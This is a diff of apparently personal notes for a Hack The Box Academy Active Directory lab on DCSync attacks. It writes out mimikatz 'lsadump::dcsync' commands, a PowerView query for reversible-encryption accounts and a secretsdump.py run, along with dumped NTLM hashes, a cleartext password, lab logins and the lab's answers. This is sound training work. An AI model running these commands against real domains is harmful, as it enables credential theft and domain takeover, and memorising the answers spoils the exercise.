@@ -196,17 +196,49 @@ Supplemental Credentials:
 
 <SNIP>+
 
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+
 Challenge : RDP to 10.129.224.53 (ACADEMY-EA-MS01) ,10.129.245.48 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "Academy_student_AD!"
 
+adunn:SyncMaster757
 
-
-Question 1 - Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer.
+Question 1 - Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer. - syncron 
 1) xfreerdp /v:10.129.224.53 /u:htb-student /p:Academy_student_AD!
+2) powershell -> run as different user -> adunn:SyncMaster757
+3) cd C:\Tools 
+4) Import-Module .\PowerView.ps1
+5) Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+Output: 
+samaccountname                         useraccountcontrol
+--------------                         ------------------
+proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
+syncron        ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
 
 
-Question 2 - What is this user's cleartext password?
-
+Question 2 - What is this user's cleartext password? - Mycleart3xtP@ss! 
+1) ssh to 172.16.5.225 FROM the RDP SESSION!!!
+2) secretsdump.py -outputfile syncron_hash -just-dc-user syncron INLANEFREIGHT/adunn@172.16.5.5
+3) output: Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+syncron:5617:aad3b435b51404eeaad3b435b51404ee:d387b9d2d9f6dda51964194ad2376ee0:::
+[*] Kerberos keys grabbed
+syncron:des-cbc-md5:37d379bad326a7ef
+[*] ClearText passwords grabbed
+syncron:CLEARTEXT:Mycleart3xtP@ss!
+[*] Cleaning up...
 
 
 Question 3 - Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer. 
+1) Pwoershell -> run as different user -> adunn:SyncMaster757 
+2) cd Tools -> mimikatz ->Win32 -> .\mimikatz.exe
+3) mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\khartsfield
+4) output: Credentials:
+  Hash NTLM: 4bb3b317845f0954200a6b0acc9b9f9a
+    ntlm- 0: 4bb3b317845f0954200a6b0acc9b9f9a
 
+Well.... both of these were MUCH easier this time once i read lololololololol
